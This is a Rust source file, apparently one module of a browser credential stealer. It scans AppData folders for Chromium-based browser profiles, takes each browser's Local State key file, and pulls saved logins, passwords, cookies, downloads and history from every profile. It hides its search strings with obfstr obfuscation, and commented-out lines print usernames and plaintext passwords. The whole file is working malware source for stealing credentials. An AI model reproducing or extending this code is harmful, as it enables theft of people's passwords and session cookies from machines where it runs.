use std::{collections::HashMap, vec};

use self::utils::Browser;
pub mod utils;
mod decrypt;

pub async fn grab() -> Vec<Browser>{
    let mut browsers = HashMap::new();

    // scan localappdata

    let scan_dirs = vec![
        obfstr::obfstr!("APPDATA").to_string(),
        obfstr::obfstr!("LOCALAPPDATA").to_string(),
    ];

    let mut thread_handles = vec![];
    let (key_tx, mut key_rx) = tokio::sync::mpsc::channel(32);

    for dir in scan_dirs {
        let key_tx = key_tx.clone(); // maybe recode, performance loss
        thread_handles.push(tokio::spawn(async move {
            for dir in walkdir::WalkDir::new(std::env::var(dir).unwrap())
                .max_depth(3)
                .into_iter()
                .filter_map(|e| e.ok())
            {
                if dir.metadata().is_ok() && dir.metadata().unwrap().is_file() {
                    continue;
                }

                if dir
                    .file_name()
                    .to_string_lossy()
                    .contains(obfstr::obfstr!("User Data"))
                {
                    let _ = key_tx
                        .clone()
                        .send(dir.path().display().to_string())
                        .await;
                }
            }
        }));
    }

    for handle in thread_handles {
        handle.await.unwrap();
    }

    loop {
        let recv = key_rx.try_recv();
        if recv.is_err() {
            break;
        }
        let recv = recv.unwrap();

        // get browser name

        let name = std::path::Path::new(&recv)
            .parent()
            .unwrap()
            .file_name()
            .unwrap()
            .to_string_lossy()
            .to_string();
        let local_state = utils::find_local_state(recv.clone());

        if local_state.is_none() {
            continue;
        }
        let local_state = local_state.unwrap();
        println!("{} - {} - {}", name, recv, local_state);
        browsers.insert(name, (recv, local_state));
    }

    
    let mut browser_output = vec![];
    
    for browser in browsers {
        let mut output = HashMap::new();
        let name = browser.0.clone();

        let path = browser.1 .0;
        let local_state = browser.1 .1;

        let mut profiles = HashMap::new();

        for file in walkdir::WalkDir::new(path.clone())
            .max_depth(4)
            .into_iter()
            .filter_map(|e| e.ok())
        {
            if file.metadata().is_ok() && file.metadata().unwrap().is_file() {
                continue;
            }

            let folder = file.path();

            if folder.join(obfstr::obfstr!("Login Data")).exists()
                && folder.join(obfstr::obfstr!("Web Data")).exists()
            {
                profiles.insert(
                    folder.file_name().unwrap().to_string_lossy().to_string(),
                    folder.display().to_string(),
                );
            }
        }


        // do shit
        for profile in profiles {
            let mut profile = utils::Profile::new(profile.0, profile.1, local_state.clone());
            profile.grab_all();

            /*for login in profile.login_data {
                println!("url {} | user {} | pw {}", login.url, login.username, login.password)
            }
            /*for cookie in profile.cookies {
                println!("site: {} | value: {}", cookie.host, cookie.value);
            }*/

            for downloads in profile.download_data {
                println!("{} | path: {}", downloads.site_url, downloads.path);
            }

            for history in profile.history {
                println!("{} | {}", history.url, history.visit_time);
            }*/

            output.insert(profile.name.clone(), profile);
            

        }

        let browser = Browser {
            name,
            path,
            profiles: output
        };
        

        browser_output.push(browser);
    }

    browser_output

}
